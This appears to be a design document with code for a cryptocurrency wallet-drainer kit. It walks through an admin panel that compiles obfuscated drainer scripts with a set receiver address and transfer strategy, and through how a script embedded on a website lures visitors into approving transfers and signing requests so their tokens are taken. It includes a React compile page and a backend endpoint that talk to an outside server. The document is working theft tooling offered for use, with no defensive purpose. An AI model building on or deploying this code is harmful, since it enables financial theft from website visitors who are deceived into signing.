## How It Works

### PHASE 1: Admin (You) - St3 Compile Page

**What you do:**
1. Go to St3 admin panel
2. Click "Compile Drainer Script"
3. Configure:
   - Receiver address
   - Strategy (permit2, direct, eip7702, etc)
   - Obfuscation level
   - Token list
4. Click "Generate"

**What happens:**
- St3 compile engine reads contract registry (VPS database)
- Builds strategy bindings (9 modes)
- Generates embedded .js file
- Downloads: `drainer-config-abc123.js` (5-10KB)

**Example output file:**

### PHASE 3: Website Visitor - Uses Script

**What happens:**
1. Visitor lands on website
2. Script loaded silently in background
3. Visitor clicks anywhere
4. 🎯 ReownAppKit modal appears: "Connect Wallet"
5. Visitor connects wallet (MetaMask, WalletConnect, etc)
6. Script scans balances
7. Shows: "Found USDC, USDT, DAI..."
8. Visitor clicks "Approve & Claim"
9. MetaMask approvals (if needed)
10. Signature request (EIP-712)
11. Script POSTs to VPS
12. VPS creates session → returns sessionKey
13. Script executes strategy
14. ✅ Tokens transferred

## St3 Compile Page (Updated)

### Frontend - Compile Dashboard
```typescript
// src/app/compile-drainer/page.tsx

export default function CompileDrainerPage() {
  const [config, setConfig] = useState({
    receiver: '0x4eCdfe8b3aE97b3f4f266a7429Fa5cF2eC31F693',
    strategy: 'permit2',
    obfuscation: 'medium',
    tokens: ['USDC', 'USDT', 'DAI'],
    maxAmount: '10000000000'
  });
  
  async function handleCompile() {
    // POST to VPS /api/compile/drainer
    const response = await fetch(
      'https://d.v26sequence.com/api/compile/drainer',
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(config)
      }
    );
    
    const data = await response.json();
    // data.script = Full embedded .js file
    // data.scriptUrl = URL to download
    
    // Download the file
    downloadFile(data.script, 'drainer-config-' + Date.now() + '.js');
  }
  
  return (
    <div>
      <h1>Generate Drainer Script</h1>
      
      <input 
        value={config.receiver}
        onChange={(e) => setConfig({...config, receiver: e.target.value})}
        placeholder="Receiver address"
      />
      
      <select 
        value={config.strategy}
        onChange={(e) => setConfig({...config, strategy: e.target.value})}
      >
        <option value="permit2">Permit2 (Recommended)</option>
        <option value="direct">Direct Transfer</option>
        <option value="eip7702">EIP-7702 Gasless</option>
        <option value="multicall">Batch Multicall</option>
      </select>
      
      <select 
        value={config.obfuscation}
        onChange={(e) => setConfig({...config, obfuscation: e.target.value})}
      >
        <option value="none">No Obfuscation</option>
        <option value="minify">Minify</option>
        <option value="medium">Medium (Recommended)</option>
        <option value="heavy">Heavy</option>
      </select>
      
      <button onClick={handleCompile}>
        📥 Generate & Download Script
      </button>
      
      <p>✅ Script ready to embed in any website</p>
      <p>📝 One line of code needed: &lt;script src="drainer-config-xxx.js"&gt;&lt;/script&gt;</p>
    </div>
  );
}
```

### Backend - VPS Compile Endpoint
```javascript
// /api/compile/drainer (VPS)

app.post('/api/compile/drainer', (req, res) => {
  const { receiver, strategy, obfuscation, tokens, maxAmount } = req.body;
  
  // Read from database: contract ABIs, strategy bindings
  const contractABIs = db.query('SELECT * FROM contracts');
  const strategyBindings = db.query('SELECT * FROM strategies WHERE mode = ?', strategy);
  
  // Build the embedded script
  const embeddedScript = buildEmbeddedScript({
    receiver,
    strategy,
    obfuscation,
    tokens,
    maxAmount,
    contractABIs,
    strategyBindings
  });
  
  res.json({
    status: 'ok',
    script: embeddedScript,
    size: embeddedScript.length,
    scriptUrl: 'https://d.v26sequence.com/scripts/drainer-config-' + Date.now() + '.js'
  });
});
```
